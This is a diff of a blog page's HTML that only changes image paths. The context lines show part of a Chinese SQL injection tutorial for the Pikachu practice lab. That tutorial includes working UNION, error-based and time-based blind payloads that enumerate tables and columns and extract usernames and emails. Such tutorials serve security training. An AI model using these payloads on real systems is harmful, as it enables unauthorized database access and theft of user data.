@@ -233,15 +233,15 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src=".%5Cimage%5Cimage-20210312213002670.png"
-                      alt="image-20210312213002670"
+                     data-src="../img/image-20210312215138909.png"
+                      alt="image-20210312215138909"
                 ></p>
 <p>id=5-2</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213023190.png"
-                      alt="image-20210312213023190"
+                     data-src="../img/image-20210312215155224.png"
+                      alt="image-20210312215155224"
                 ></p>
 <p>可见id值为“3”与id值为“5-2”所得反馈相同</p>
 <p>即该注入点为数字型注入</p>
@@ -261,8 +261,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213052806.png"
-                      alt="image-20210312213052806"
+                     data-src="../img/image-20210312215208687.png"
+                      alt="image-20210312215208687"
                 ></p>
 <p>既执行了id=1的查询，也执行了union后的查询</p>
 <p>指定id=-1或一个很大的值，使其无法正常执行原查询，则会执行union后的查询</p>
@@ -274,8 +274,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213113737.png"
-                      alt="image-20210312213113737"
+                     data-src="../img/image-20210312215222481.png"
+                      alt="image-20210312215222481"
                 ></p>
 <p>之后可通过修改查询语句进行对数据库的查询</p>
 <p>查询表名</p>
@@ -285,8 +285,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213130999.png"
-                      alt="image-20210312213130999"
+                     data-src="../img/image-20210312215236382.png"
+                      alt="image-20210312215236382"
                 ></p>
 <p>在原有数据后面加上”limit 1,1“参数即可显示第二条记录</p>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> union select <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
@@ -295,8 +295,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213152754.png"
-                      alt="image-20210312213152754"
+                     data-src="../img/image-20210312215248216.png"
+                      alt="image-20210312215248216"
                 ></p>
 <p>同理”limit 2,1“为限定查询结果第二条记录的后一条记录</p>
 <p>同理”limit 0,100“为限定查询结果的前一百条记录</p>
@@ -305,8 +305,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213212213.png"
-                      alt="image-20210312213212213"
+                     data-src="../img/image-20210312215301779.png"
+                      alt="image-20210312215301779"
                 ></p>
 <p>亦可使用”group_concat“来用”,“联合多行记录</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #查询所有表名</span><br><span class="line">或</span><br><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27; #查询“pikachu”库下所有表名</span><br></pre></td></tr></table></figure>
@@ -314,8 +314,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213233115.png"
-                      alt="image-20210312213233115"
+                     data-src="../img/image-20210312215319586.png"
+                      alt="image-20210312215319586"
                 ></p>
 <p>继续查询所需要的</p>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;member&#x27;</span></span><br><span class="line">id=-<span class="number">1</span> union select username,email <span class="keyword">from</span> member</span><br></pre></td></tr></table></figure>
@@ -324,8 +324,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213248004.png"
-                      alt="image-20210312213248004"
+                     data-src="../img/image-20210312215334880.png"
+                      alt="image-20210312215334880"
                 ></p>
 <h2 id="UNION注入-字符型注入"><a href="#UNION注入-字符型注入" class="headerlink" title="UNION注入-字符型注入"></a>UNION注入-字符型注入</h2><p>GET参数输入的地方包裹单引号，变成字符串</p>
 <p>注入方式：尝试闭合前面单引号，且注释后面的语句</p>
@@ -340,8 +340,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213318056.png"
-                      alt="image-20210312213318056"
+                     data-src="../img/image-20210312215351620.png"
+                      alt="image-20210312215351620"
                 ></p>
 <p>修改union后面的查询语句即可继续查询所需的内容</p>
 <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>利用页面报错信息获取数据</p>
@@ -375,8 +375,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213331664.png"
-                      alt="image-20210312213331664"
+                     data-src="../img/image-20210312215406724.png"
+                      alt="image-20210312215406724"
                 ></p>
 <p>将database()函数替换为其他查询语句即可</p>
 <h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>通过注入得到的真假回显推测出数据</p>
@@ -421,8 +421,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="E:\BLOG\BEACON\source_posts\image\image-20210312213349392.png"
-                      alt="image-20210312213349392"
+                     data-src="../img/image-20210312215421448.png"
+                      alt="image-20210312215421448"
                 ></p>
 <p>判断数据库名</p>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and if((substr(database(), 1, 1))=&#x27;</span>p<span class="string">&#x27;, sleep(3), null)#</span></span><br></pre></td></tr></table></figure>
